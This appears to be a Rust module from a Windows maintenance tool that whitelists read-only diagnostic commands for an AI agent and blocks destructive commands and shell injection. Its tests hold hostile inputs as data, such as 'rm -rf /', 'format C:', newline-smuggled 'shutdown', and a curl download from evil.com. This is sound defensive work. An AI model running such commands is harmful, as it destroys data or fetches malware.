use serde::Serialize;
use std::collections::HashSet;
use std::process::Command;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

use crate::error::NiTriTeError;
use crate::maintenance::commands::decode_output;

#[derive(Debug, Clone, Serialize)]
pub struct SafeCommandResult {
    pub command: String,
    pub success: bool,
    pub stdout: String,
    pub stderr: String,
}

/// Whitelist de commandes autorisees (lecture seule)
fn safe_commands() -> HashSet<&'static str> {
    [
        "systeminfo", "tasklist", "ipconfig", "netstat", "ping", "tracert",
        "nslookup", "hostname", "ver", "wmic", "driverquery", "whoami",
        "powercfg", "Get-Process", "Get-Service", "Get-NetAdapter",
        "Get-ComputerInfo", "Get-Volume", "cleanmgr", "msinfo32",
    ].into_iter().collect()
}

/// Blacklist absolue
fn blocked_commands() -> HashSet<&'static str> {
    [
        "del", "rm", "rmdir", "format", "fdisk", "diskpart", "shutdown",
        "restart", "reboot", "taskkill", "reg", "Remove-Item", "net",
        "takeown", "icacls", "cipher", "bcdedit", "bcdboot",
    ].into_iter().collect()
}

/// Caracteres suspects d'injection de commandes
fn has_injection(cmd: &str) -> bool {
    // "&" seul est un séparateur cmd.exe (cmd1 & cmd2) — autant que "&&".
    // Les sauts de ligne (\n, \r) sont CRITIQUES : `first_word` vient de
    // split_whitespace (qui les avale), donc « ping 8.8.8.8\r\nshutdown /s »
    // passait la whitelist alors que cmd /C exécute la 2e ligne. On bloque aussi
    // "%" (expansion de variables d'environnement dans cmd.exe).
    ["&", "&&", "||", "|", ";", ">", ">>", "<", "`", "$(", "\n", "\r", "%"]
        .iter()
        .any(|c| cmd.contains(c))
}

/// Validation des arguments pour les commandes potentiellement dangereuses selon leurs arguments.
/// `wmic` et `powercfg` sont whitelistés mais peuvent exécuter des actions destructives
/// selon les sous-commandes passées — ce niveau valide les arguments, pas seulement le premier mot.
fn validate_command_args(first_word: &str, args: &[&str]) -> Result<(), NiTriTeError> {
    match first_word {
        "wmic" => {
            // Interdire les verbes WMIC qui modifient l'état système
            let dangerous_verbs = ["call", "create", "delete", "set", "assoc"];
            for arg in args {
                let lower = arg.to_lowercase();
                if dangerous_verbs.contains(&lower.as_str()) {
                    return Err(NiTriTeError::CommandDenied(
                        format!("wmic: sous-commande '{}' interdite (opération mutante)", arg)
                    ));
                }
            }
        }
        "powercfg" => {
            // Autoriser uniquement les sous-commandes de rapport/lecture
            const ALLOWED: &[&str] = &[
                "/batteryreport", "/energy", "/list", "/l",
                "/query", "/q", "/getactivescheme", "/a",
            ];
            if let Some(first_arg) = args.first() {
                let lower = first_arg.to_lowercase();
                if !ALLOWED.iter().any(|a| lower == *a) {
                    return Err(NiTriTeError::CommandDenied(
                        format!("powercfg: argument '{}' non autorisé (lecture seule uniquement)", first_arg)
                    ));
                }
            }
        }
        _ => {}
    }
    Ok(())
}

pub fn is_safe(command: &str) -> Result<(), NiTriTeError> {
    let parts: Vec<&str> = command.split_whitespace().collect();
    let first_word = parts.first().copied().unwrap_or("").to_lowercase();

    if blocked_commands().iter().any(|b| first_word == b.to_lowercase()) {
        return Err(NiTriTeError::CommandDenied(format!("Commande interdite: {}", first_word)));
    }

    if has_injection(command) {
        return Err(NiTriTeError::CommandDenied("Caracteres d'injection detectes".into()));
    }

    if !safe_commands().iter().any(|s| first_word == s.to_lowercase()) {
        return Err(NiTriTeError::CommandDenied(format!("Commande non autorisee: {}", first_word)));
    }

    // Validation des arguments pour les commandes sensibles
    validate_command_args(&first_word, &parts[1..])
}

pub fn execute_safe(command: &str) -> Result<SafeCommandResult, NiTriTeError> {
    is_safe(command)?;

    let output = Command::new("cmd")
        .args(["/C", command])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| NiTriTeError::System(e.to_string()))?;

    // decode_output : systeminfo/driverquery/tasklist (whitelistés ci-dessus)
    // sont les cas classiques OEM — confirmé en direct sur cette machine
    // (« Nom d'hôte », « Mode de démarrage », « État » corrompus). Cette
    // sortie alimente aussi le contexte de l'agent IA, pas seulement l'UI.
    Ok(SafeCommandResult {
        command: command.to_string(),
        success: output.status.success(),
        stdout: decode_output(&output.stdout),
        stderr: decode_output(&output.stderr),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    // Live, non-CI (ignorée par défaut) : confirme sur une vraie machine Windows
    // que execute_safe() ne produit plus de mojibake sur les commandes OEM
    // classiques (« Nom d'hôte », « Mode de démarrage »... — corruption
    // confirmée avant fix via repro Rust direct sur systeminfo/driverquery).
    #[test]
    #[ignore]
    fn execute_safe_systeminfo_no_mojibake() {
        let result = execute_safe("systeminfo").expect("execute_safe failed");
        assert!(!result.stdout.contains('\u{FFFD}'), "mojibake détecté dans systeminfo : {:?}", &result.stdout[..result.stdout.len().min(300)]);
    }

    // ── Whitelist / Blacklist ──────────────────────────────────────────────────

    #[test]
    fn allows_safe_ipconfig() {
        assert!(is_safe("ipconfig /all").is_ok());
    }

    #[test]
    fn allows_safe_ping() {
        assert!(is_safe("ping 8.8.8.8").is_ok());
    }

    #[test]
    fn allows_wmic_readonly_query() {
        assert!(is_safe("wmic cpu get name").is_ok());
    }

    #[test]
    fn allows_powercfg_batteryreport() {
        assert!(is_safe("powercfg /batteryreport").is_ok());
    }

    #[test]
    fn allows_powercfg_list() {
        assert!(is_safe("powercfg /list").is_ok());
    }

    // ── Blacklist absolue ─────────────────────────────────────────────────────

    #[test]
    fn blocks_rm() {
        assert!(is_safe("rm -rf /").is_err());
    }

    #[test]
    fn blocks_del() {
        assert!(is_safe("del C:\\Windows\\System32").is_err());
    }

    #[test]
    fn blocks_shutdown() {
        assert!(is_safe("shutdown /s /t 0").is_err());
    }

    #[test]
    fn blocks_format() {
        assert!(is_safe("format C:").is_err());
    }

    #[test]
    fn blocks_bcdedit() {
        assert!(is_safe("bcdedit /set safeboot minimal").is_err());
    }

    // ── Injection ─────────────────────────────────────────────────────────────

    #[test]
    fn blocks_pipe_injection() {
        assert!(is_safe("ipconfig | del important.txt").is_err());
    }

    #[test]
    fn blocks_and_injection() {
        assert!(is_safe("ping 8.8.8.8 && format C:").is_err());
    }

    #[test]
    fn blocks_redirect_injection() {
        assert!(is_safe("ipconfig > C:\\evil.txt").is_err());
    }

    #[test]
    fn blocks_subshell_injection() {
        assert!(is_safe("ping $(whoami)").is_err());
    }

    #[test]
    fn blocks_newline_injection() {
        // first_word vient de split_whitespace (avale le \n) : sans blocage du
        // saut de ligne, la 2e ligne s'exécutait via cmd /C.
        assert!(is_safe("ping 8.8.8.8\r\nshutdown /s /t 0").is_err());
        assert!(is_safe("ipconfig\ndel important.txt").is_err());
    }

    #[test]
    fn blocks_env_var_expansion() {
        assert!(is_safe("ping %COMPUTERNAME%").is_err());
    }

    // ── Validation arguments (commandes sensibles) ────────────────────────────

    #[test]
    fn blocks_wmic_process_create() {
        assert!(is_safe("wmic process call create calc.exe").is_err());
    }

    #[test]
    fn blocks_wmic_delete() {
        assert!(is_safe("wmic process where name='virus.exe' delete").is_err());
    }

    #[test]
    fn blocks_wmic_set() {
        assert!(is_safe("wmic service where name='spooler' set startmode=disabled").is_err());
    }

    #[test]
    fn blocks_powercfg_hibernate_off() {
        assert!(is_safe("powercfg /hibernate off").is_err());
    }

    #[test]
    fn blocks_powercfg_change() {
        assert!(is_safe("powercfg /change standby-timeout-ac 0").is_err());
    }

    #[test]
    fn blocks_unknown_command() {
        assert!(is_safe("curl http://evil.com/malware.exe").is_err());
    }

    #[test]
    fn blocks_single_ampersand_injection() {
        // "&" seul est un séparateur cmd.exe (cmd1 & cmd2), pas seulement "&&"
        assert!(is_safe("ping 8.8.8.8 & del /f C:\\file.txt").is_err());
    }
}
